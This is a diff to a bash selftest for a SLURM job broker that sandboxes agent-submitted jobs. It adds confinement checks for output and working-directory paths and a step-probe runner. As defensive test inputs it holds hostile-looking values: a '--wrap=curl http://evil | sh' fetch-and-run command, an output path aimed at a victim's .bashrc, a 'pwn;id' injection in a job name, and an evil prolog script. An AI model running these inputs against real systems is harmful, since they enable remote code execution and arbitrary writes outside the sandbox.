@@ -96,9 +96,15 @@ if [ -d "$HERE/broker/src" ]; then
 fi
 
 SPOOL="$(mktemp -d "${TMPDIR:-/tmp}/husk-selftest-spool.XXXXXX")"
+# The policy tier used a fictional /work as the request cwd, which was fine while every
+# decision was a pure function of the request. It is not any more: --chdir/--output/--error
+# are confined to the working directory, and confinement RESOLVES paths on disk (a lexical
+# check would let a symlink out of the tree past it, which is the whole point). So the
+# tier needs a real directory. It stays deterministic - nothing depends on the contents.
+PWORK="$(mktemp -d "${TMPDIR:-/tmp}/husk-selftest-pwork.XXXXXX")"
 BROKER_LOG="$SPOOL/broker.stderr.log"
 CANARY="husk-canary-$$-do-not-leak"
-CLEANUP=("$SPOOL")
+CLEANUP=("$SPOOL" "$PWORK")
 # Keep the evidence when something FAILED: the report points at the job's SLURM
 # output ("see .../slurm-<id>.out"), and that file lives in the work dir — deleting
 # it on the way out destroys the one artifact needed to diagnose the failure.
@@ -214,13 +220,13 @@ echo hi
 
 # P1 — a valid submission (partition == the site's required one) is accepted.
 reset_spool
-mkreq p1 sbatch "[\"--partition=$PART\"]" /work "$VALID_BODY"
+mkreq p1 sbatch "[\"--partition=$PART\"]" "$PWORK" "$VALID_BODY"
 run_broker dry "$SPOOL/out.p1"
 expect_status p1 submitted sbatch.valid "valid --partition=$PART submission accepted"
 
 # P2 — no partition is rejected AND the message names the required partition.
 reset_spool
-mkreq p2 sbatch '["--nodes=1"]' /work "$VALID_BODY"
+mkreq p2 sbatch '["--nodes=1"]' "$PWORK" "$VALID_BODY"
 run_broker dry "$SPOOL/out.p2"
 if [ "$(respfield p2 status)" = rejected ] && respfield p2 message | grep -qi -- "$PART"; then
   check PASS policy sbatch.no_partition "rejected + teaches --partition=$PART"
@@ -230,7 +236,7 @@ fi
 
 # P3 — a wrong partition is rejected.
 reset_spool
-mkreq p3 sbatch "[\"--partition=${PART}-nope\"]" /work "$VALID_BODY"
+mkreq p3 sbatch "[\"--partition=${PART}-nope\"]" "$PWORK" "$VALID_BODY"
 run_broker dry "$SPOOL/out.p3"
 expect_status p3 rejected sbatch.wrong_partition "partition != $PART rejected"
 
@@ -240,7 +246,7 @@ DIRECTIVE_BODY="#!/bin/bash
 #SBATCH --partition=$PART
 echo hi
 "
-mkreq p4 sbatch '[]' /work "$DIRECTIVE_BODY"
+mkreq p4 sbatch '[]' "$PWORK" "$DIRECTIVE_BODY"
 run_broker dry "$SPOOL/out.p4"
 expect_status p4 submitted sbatch.directive_partition "#SBATCH partition directive honoured"
 
@@ -250,22 +256,44 @@ expect_status p4 submitted sbatch.directive_partition "#SBATCH partition directi
 # (We use a sentinel export var, NOT ALL: the broker itself legitimately forces
 # --export=ALL for uenv jobs, so ALL can't distinguish a leak from the broker's own.)
 reset_spool
-mkreq p5 sbatch "[\"--partition=$PART\",\"-o\",\"/users/victim/.bashrc\",\"--chdir=/evil\",\"--export=SNEAKYVAR\",\"--time=01:00:00\"]" /work "$VALID_BODY"
+mkreq p5 sbatch "[\"--partition=$PART\",\"--export=SNEAKYVAR\",\"--time=01:00:00\"]" "$PWORK" "$VALID_BODY"
 run_broker dry "$SPOOL/out.p5"
 ARGV_LINE="$(grep -m1 '^argv:' "$SPOOL/out.p5" || true)"
 p5_ok=1; p5_why=""
-grep -q '/users/victim/.bashrc' <<<"$ARGV_LINE" && { p5_ok=0; p5_why+="leaked -o path; "; }
-grep -q '/evil'                 <<<"$ARGV_LINE" && { p5_ok=0; p5_why+="leaked --chdir; "; }
 grep -q 'SNEAKYVAR'             <<<"$ARGV_LINE" && { p5_ok=0; p5_why+="leaked agent --export; "; }
-grep -q 'output=/work/slurm-%j.out' <<<"$ARGV_LINE" || { p5_ok=0; p5_why+="no forced --output; "; }
-grep -q 'chdir=/work'           <<<"$ARGV_LINE" || { p5_ok=0; p5_why+="no forced --chdir; "; }
+grep -q 'export=ALL'            <<<"$ARGV_LINE" || { p5_ok=0; p5_why+="no forced --export=ALL; "; }
+grep -q "output=$PWORK/slurm-%j.out" <<<"$ARGV_LINE" || { p5_ok=0; p5_why+="no default --output; "; }
+grep -q "chdir=$PWORK"          <<<"$ARGV_LINE" || { p5_ok=0; p5_why+="no default --chdir; "; }
 grep -q 'time=01:00:00'         <<<"$ARGV_LINE" || { p5_ok=0; p5_why+="dropped benign --time; "; }
-if [ "$p5_ok" = 1 ]; then check PASS policy sbatch.force_safe "dangerous -o/--chdir/agent --export forced safe; benign --time kept"
+if [ "$p5_ok" = 1 ]; then check PASS policy sbatch.force_safe "agent --export forced to ALL; default output/chdir applied; benign --time kept"
 else check FAIL policy sbatch.force_safe "${p5_why%; }"; fi
+
+# --output/--chdir pointing OUT of the working directory must be REFUSED, not quietly
+# replaced. slurmd writes those files as you and OUTSIDE the cage, so an unconfined path
+# is an uncaged arbitrary write (job stdout into ~/.bashrc is AV2 with the cage bypassed).
+# Both the glued short spelling and an absolute path are checked, because F13 was exactly
+# a spelling that slipped past.
+mkreq p5b sbatch "[\"--partition=$PART\",\"-o/users/victim/.bashrc\"]" "$PWORK" "$VALID_BODY"
+run_broker dry "$SPOOL/out.p5b"
+p5b_st="$(respfield p5b status)"; p5b_msg="$(respfield p5b message)"
+if [ "$p5b_st" = rejected ] && grep -qi 'output' <<<"$p5b_msg"; then
+  check PASS policy sbatch.output_confined "glued -o outside the workdir rejected: ${p5b_msg:0:70}"
+else
+  check FAIL policy sbatch.output_confined "status=$p5b_st msg=$p5b_msg (an uncaged write path was not refused)"
+fi
+
+mkreq p5c sbatch "[\"--partition=$PART\",\"--chdir=/evil\"]" "$PWORK" "$VALID_BODY"
+run_broker dry "$SPOOL/out.p5c"
+p5c_st="$(respfield p5c status)"
+if [ "$p5c_st" = rejected ]; then
+  check PASS policy sbatch.chdir_confined "--chdir outside the workdir rejected"
+else
+  check FAIL policy sbatch.chdir_confined "status=$p5c_st (--chdir escaped the workdir)"
+fi
 
 # P6 — a read-only query is routed to Query (status=ok), not rejected.
 reset_spool
-mkreq p6 squeue '["--me"]' /work ""
+mkreq p6 squeue '["--me"]' "$PWORK" ""
 run_broker dry "$SPOOL/out.p6"
 expect_status p6 ok squeue.routed "read-only squeue routed to a query"
 
@@ -273,7 +301,7 @@ expect_status p6 ok squeue.routed "read-only squeue routed to a query"
 i=7
 for tool in scancel srun salloc; do
   reset_spool
-  mkreq "p$i" "$tool" '["x"]' /work ""
+  mkreq "p$i" "$tool" '["x"]' "$PWORK" ""
   run_broker dry "$SPOOL/out.p$i"
   expect_status "p$i" rejected "$tool.rejected" "$tool is not brokered"
   i=$((i+1))
@@ -281,7 +309,7 @@ done
 
 # P10 — an unsupported protocol version is rejected before any tool dispatch.
 reset_spool
-mkreq p10 sbatch "[\"--partition=$PART\"]" /work "$VALID_BODY" 999
+mkreq p10 sbatch "[\"--partition=$PART\"]" "$PWORK" "$VALID_BODY" 999
 run_broker dry "$SPOOL/out.p10"
 expect_status p10 rejected proto.version "unsupported protocol version rejected"
 
@@ -292,7 +320,7 @@ expect_status p10 rejected proto.version "unsupported protocol version rejected"
 
 # P11 — an option NOT on the allowlist is rejected outright (not passed through).
 reset_spool
-mkreq p11 sbatch "[\"--partition=$PART\",\"--get-user-env\"]" /work "$VALID_BODY"
+mkreq p11 sbatch "[\"--partition=$PART\",\"--get-user-env\"]" "$PWORK" "$VALID_BODY"
 run_broker dry "$SPOOL/out.p11"
 expect_status p11 rejected sbatch.unknown_option "unsupported CLI option rejected (allowlist)"
 
@@ -300,7 +328,7 @@ expect_status p11 rejected sbatch.unknown_option "unsupported CLI option rejecte
 # single-node (multi-node needs an IP path for the PMI bootstrap), and a job that asked
 # for 4 nodes but ran on 1 would report success having used a quarter of the resources.
 reset_spool
-mkreq p11b sbatch "[\"--partition=$PART\",\"--nodes=4\"]" /work "$VALID_BODY"
+mkreq p11b sbatch "[\"--partition=$PART\",\"--nodes=4\"]" "$PWORK" "$VALID_BODY"
 run_broker dry "$SPOOL/out.p11b"
 expect_status p11b rejected sbatch.multinode "multi-node rejected (single-node cage profile)"
 
@@ -308,7 +336,7 @@ expect_status p11b rejected sbatch.multinode "multi-node rejected (single-node c
 # the agent never mentioned it, so the scheduler cannot spread --ntasks over nodes and
 # leave the job wearing a single-node cage on a multi-node allocation.
 reset_spool
-mkreq p11c sbatch "[\"--partition=$PART\",\"--ntasks=8\"]" /work "$VALID_BODY"
+mkreq p11c sbatch "[\"--partition=$PART\",\"--ntasks=8\"]" "$PWORK" "$VALID_BODY"
 run_broker dry "$SPOOL/out.p11c"
 # Match the `argv:` line ONLY. The probe body carries its own `#SBATCH --nodes=1`, so a
 # whole-file grep passes even against a broker that forces nothing — it was a false
@@ -323,7 +351,7 @@ fi
 # P12 — a benign option carrying an out-of-grammar / injection VALUE is rejected.
 # (';' is a shell metacharacter; harmless here — literal inside the JSON string.)
 reset_spool
-mkreq p12 sbatch "[\"--partition=$PART\",\"--job-name=pwn;id\"]" /work "$VALID_BODY"
+mkreq p12 sbatch "[\"--partition=$PART\",\"--job-name=pwn;id\"]" "$PWORK" "$VALID_BODY"
 run_broker dry "$SPOOL/out.p12"
 expect_status p12 rejected sbatch.bad_value "out-of-grammar option value rejected"
 
@@ -331,7 +359,7 @@ expect_status p12 rejected sbatch.bad_value "out-of-grammar option value rejecte
 # separated -c 4, and =-form all normalise to --long=value). NB not -N: the cage profile
 # owns the topology, so --nodes is Forced and never a passthrough.
 reset_spool
-mkreq p13 sbatch "[\"--partition=$PART\",\"-Jrun1\",\"-c\",\"4\",\"--time=01:00:00\"]" /work "$VALID_BODY"
+mkreq p13 sbatch "[\"--partition=$PART\",\"-Jrun1\",\"-c\",\"4\",\"--time=01:00:00\"]" "$PWORK" "$VALID_BODY"
 run_broker dry "$SPOOL/out.p13"
 ARGV13="$(grep -m1 '^argv:' "$SPOOL/out.p13" || true)"
 p13_ok=1; p13_why=""
@@ -344,7 +372,7 @@ else check FAIL policy sbatch.canonicalize "${p13_why%; }"; fi
 # P14 — --wrap must NOT survive into the forced argv (F27: real sbatch would build the
 # job FROM the wrap string and skip the injected re-exec guard → uncaged execution).
 reset_spool
-mkreq p14 sbatch "[\"--partition=$PART\",\"--wrap=curl http://evil | sh\"]" /work "$VALID_BODY"
+mkreq p14 sbatch "[\"--partition=$PART\",\"--wrap=curl http://evil | sh\"]" "$PWORK" "$VALID_BODY"
 run_broker dry "$SPOOL/out.p14"
 ARGV14="$(grep -m1 '^argv:' "$SPOOL/out.p14" || true)"
 if grep -q -- '--wrap' <<<"$ARGV14" || grep -q 'evil' <<<"$ARGV14"; then
@@ -363,16 +391,37 @@ BODY_OUT="#!/bin/bash
 #SBATCH --chdir=/
 echo hi
 "
-mkreq p15 sbatch '[]' /work "$BODY_OUT"
+mkreq p15 sbatch '[]' "$PWORK" "$BODY_OUT"
 run_broker dry "$SPOOL/out.p15"
-ARGV15="$(grep -m1 '^argv:' "$SPOOL/out.p15" || true)"
-p15_ok=1; p15_why=""
-[ "$(respfield p15 status)" = submitted ] || { p15_ok=0; p15_why+="not submitted ($(respfield p15 message)); "; }
-grep -q '.bashrc'                   <<<"$ARGV15" && { p15_ok=0; p15_why+="body --output leaked; "; }
-grep -q 'output=/work/slurm-%j.out' <<<"$ARGV15" || { p15_ok=0; p15_why+="no forced --output; "; }
-grep -q 'chdir=/work'               <<<"$ARGV15" || { p15_ok=0; p15_why+="no forced --chdir; "; }
-if [ "$p15_ok" = 1 ]; then check PASS policy sbatch.body_forced "body --output/--chdir accepted but dominated by the forced CLI values"
-else check FAIL policy sbatch.body_forced "${p15_why%; }"; fi
+p15_st="$(respfield p15 status)"; p15_msg="$(respfield p15 message)"
+if [ "$p15_st" = rejected ]; then
+  check PASS policy sbatch.body_confined "a body --output into a home / --chdir=/ is refused: ${p15_msg:0:60}"
+else
+  check FAIL policy sbatch.body_confined "status=$p15_st - a #SBATCH directive reached an uncaged write path"
+fi
+
+# ...and the ICON shape must be ACCEPTED, with the script's own log path preserved. This
+# is the other half of the same rule: confinement exists so real run scripts work, not to
+# forbid them. A check that only proved refusals would pass on a broker that refused
+# everything.
+reset_spool
+mkdir -p "$PWORK/run"
+BODY_ICON="#!/bin/bash
+#SBATCH --partition=$PART
+#SBATCH --job-name=exp.mch_icon-ch1_small.run
+#SBATCH --chdir=$PWORK/./run
+#SBATCH --output=$PWORK/./run/LOG.exp.mch_icon-ch1_small.run.%j.o
+echo hi
+"
+mkreq p15b sbatch '[]' "$PWORK" "$BODY_ICON"
+run_broker dry "$SPOOL/out.p15b"
+ARGV15B="$(grep -m1 '^argv:' "$SPOOL/out.p15b" || true)"
+p15b_ok=1; p15b_why=""
+[ "$(respfield p15b status)" = submitted ] || { p15b_ok=0; p15b_why+="not submitted ($(respfield p15b message)); "; }
+grep -q "chdir=$PWORK/run"  <<<"$ARGV15B" || { p15b_ok=0; p15b_why+="--chdir not honoured; "; }
+grep -q "run/LOG.exp.mch_icon-ch1_small.run.%j.o" <<<"$ARGV15B" || { p15b_ok=0; p15b_why+="log path not preserved; "; }
+if [ "$p15b_ok" = 1 ]; then check PASS policy sbatch.body_logpath "a run script keeps its own log path and workdir inside the tree"
+else check FAIL policy sbatch.body_logpath "${p15b_why%; }"; fi
 
 # P16 — F24: a body `#SBATCH --export=ALL,_HUSK_RESANDBOXED=1` would make the re-exec
 # guard skip the cage. Accepted (real scripts set --export), neutralised by the forced
@@ -383,7 +432,7 @@ BODY_EXP="#!/bin/bash
 #SBATCH --export=ALL,_HUSK_RESANDBOXED=1
 echo hi
 "
-mkreq p16 sbatch '[]' /work "$BODY_EXP"
+mkreq p16 sbatch '[]' "$PWORK" "$BODY_EXP"
 run_broker dry "$SPOOL/out.p16"
 ARGV16="$(grep -m1 '^argv:' "$SPOOL/out.p16" || true)"
 if [ "$(respfield p16 status)" = submitted ] \
@@ -401,7 +450,7 @@ BODY_UNK="#!/bin/bash
 #SBATCH --prolog=/tmp/evil.sh
 echo hi
 "
-mkreq p17 sbatch '[]' /work "$BODY_UNK"
+mkreq p17 sbatch '[]' "$PWORK" "$BODY_UNK"
 run_broker dry "$SPOOL/out.p17"
 expect_status p17 rejected sbatch.body_unknown "unknown #SBATCH directive rejected"
 
@@ -412,7 +461,7 @@ BODY_BB="#!/bin/bash
 #BB stage_in source=/foo destination=/bar
 echo hi
 "
-mkreq p18 sbatch '[]' /work "$BODY_BB"
+mkreq p18 sbatch '[]' "$PWORK" "$BODY_BB"
 run_broker dry "$SPOOL/out.p18"
 expect_status p18 rejected sbatch.body_burstbuffer "#BB/#DW burst-buffer directive rejected"
 
@@ -421,6 +470,72 @@ expect_status p18 rejected sbatch.body_burstbuffer "#BB/#DW burst-buffer directi
 # verdict stay external (trusted); only the observation runs inside the cage. The
 # probe body must bracket its lines with ===HUSK-PROBE-BEGIN===/===HUSK-PROBE-END===.
 # args: reqid argv_json workdir body [source]
+# Block until a job leaves the queue. Shared by every live arm so the timeout and the
+# post-run flush delay exist in ONE place - a second copy is a second thing to forget.
+wait_for_job() {
+  local _
+  for _ in $(seq 1 150); do
+    squeue -h -j "$1" 2>/dev/null | grep -q . || break
+    sleep 2
+  done
+  sleep 1  # let the final output flush
+}
+
+# Submit srun-probe.sh THROUGH the broker and translate its verdicts.
+#
+# It SHELLS OUT to the real script rather than reimplementing its checks. That script is
+# the one a human runs by hand when the step pair misbehaves, so a copy here would be a
+# second thing to keep in step with the step-broker - and the copy that drifts is the one
+# that reports green while the real path is broken.
+#
+# The translation is deliberately narrow: only lines the script marks `[expect]` count as
+# PASS. Its own comments explain why several of those checks would otherwise pass with no
+# husk in the path at all (the real srun also fails on a missing --task-prolog), so a
+# looser mapping here would throw away the discrimination the script was written to have.
+run_srun_probe() {
+  local work="$1" script="$HERE/srun-probe.sh"
+  if [ ! -r "$script" ]; then
+    check SKIP containment steps.probe "srun-probe.sh not found beside selftest.sh"
+    return
+  fi
+  reset_spool
+  mkreq srunprobe sbatch '[]' "$work" "$(cat "$script")" 1 file
+  run_broker live "$SPOOL/out.srunprobe" "$work"
+  local st jid; st="$(respfield srunprobe status)"; jid="$(respfield srunprobe job_id)"
+  if [ "$st" != submitted ]; then
+    check FAIL containment steps.submit "broker did not submit srun-probe: status=$st msg=$(respfield srunprobe message)"
+    return
+  fi
+  check PASS containment steps.submit "srun-probe submitted; job_id=$jid"
+  echo "   waiting for srun-probe job $jid ..."
+  wait_for_job "$jid"
+  local out="$work/slurm-$jid.out"
+  if [ ! -f "$out" ]; then
+    check FAIL containment steps.output "no output at $out from the srun-probe job"
+    return
+  fi
+  local line seen=0
+  while IFS= read -r line; do
+    case "$line" in
+      "step : OK"*)   seen=1; check PASS containment steps.launch  "srun ran a step through the stub + step-broker" ;;
+      "step : FAILED"*) seen=1; check FAIL containment steps.launch "brokered srun could not launch a step" ;;
+      "cage : homes hidden"*) check PASS containment steps.cage    "ranks are sandboxed (homes hidden inside the step)" ;;
+      "cage : /users shows"*) check FAIL containment steps.cage    "a rank could see other homes - the per-task wrap is not applied" ;;
+      "deny : --task-prolog refused"*) check PASS containment steps.allowlist "the step allowlist refused --task-prolog by husk's own message" ;;
+      "deny : --task-prolog ACCEPTED"*) check FAIL containment steps.allowlist "--task-prolog accepted - a step can run code outside the rank cage" ;;
+      "deny : --task-prolog failed, but NOT via husk"*) check FAIL containment steps.allowlist "the stub is not bound: that refusal came from the real srun, not husk" ;;
+      "rank2: OK"*)   check PASS containment steps.multirank "2 ranks in one step, both caged" ;;
+      "rank2:"*)      check FAIL containment steps.multirank "multi-rank step wrong: ${line#rank2: }" ;;
+      "shm  : OK"*)   check PASS functional  steps.shm       "ranks share /dev/shm (same-node MPI would hang otherwise)" ;;
+      "shm  :"*)      check FAIL functional  steps.shm       "ranks do not share /dev/shm: ${line#shm  : }" ;;
+      "env  : the script"*) check PASS functional steps.env  "a run script's exported variable reaches its ranks" ;;
+      "env  :"*)      check FAIL functional  steps.env       "run-script environment does not reach the ranks: ${line#env  : }" ;;
+    esac
+  done < "$out"
+  [ "$seen" = 1 ] || check FAIL containment steps.launch \
+    "srun-probe produced no step verdict - see $out and ${out%.out}.err"
+}
+
 run_live_probe() {
   local reqid="$1" argv="$2" work="$3" body="$4" src="${5:-file}"
   reset_spool
@@ -434,12 +549,7 @@ run_live_probe() {
   check PASS containment "$reqid.submit" "real sbatch accepted; job_id=$jid (proves MUNGE + controller + partition)"
   local out="$work/slurm-$jid.out"
   echo "   waiting for job $jid to finish (output: $out) ..."
-  local _
-  for _ in $(seq 1 150); do
-    squeue -h -j "$jid" 2>/dev/null | grep -q . || break
-    sleep 2
-  done
-  sleep 1  # let the final output flush
+  wait_for_job "$jid"
   # Ask SLURM why, so a failure is self-diagnosing instead of a guess. Exit 127 from
   # the batch step means the guard's `seccomp-wrapper bwrap ...` was not found on the
   # compute node — i.e. husk is not installed there, or ~/.local/bin is not on the PATH
@@ -866,6 +976,13 @@ echo "===HUSK-PROBE-END==="
     # directly and this probe would reach the net (FAIL).
     WRAP_BODY='echo ===HUSK-PROBE-BEGIN===; echo "FP wrap_resandboxed ${_HUSK_RESANDBOXED:-0}"; if timeout 5 bash -c ": < /dev/tcp/1.1.1.1/443" 2>/dev/null; then echo "RESULT FAIL containment wrap.caged --wrap job reached the network (NOT caged - F27 regressed)"; else echo "RESULT PASS containment wrap.caged --wrap job ran through the guard, caged (no net)"; fi; echo ===HUSK-PROBE-END==='
     run_live_probe wrapprobe "[\"--partition=$PART\"]" "$WORK" "$WRAP_BODY" wrap
+
+    # The step pair, end to end, by SHELLING OUT to srun-probe.sh rather than
+    # reimplementing it here. That script is what a human runs by hand when steps
+    # misbehave, so a second copy of its checks would be a second thing to keep in step
+    # with the step-broker - and it is the copy that drifts which reports green while the
+    # real path is broken.
+    run_srun_probe "$WORK"
   fi
 else
   echo
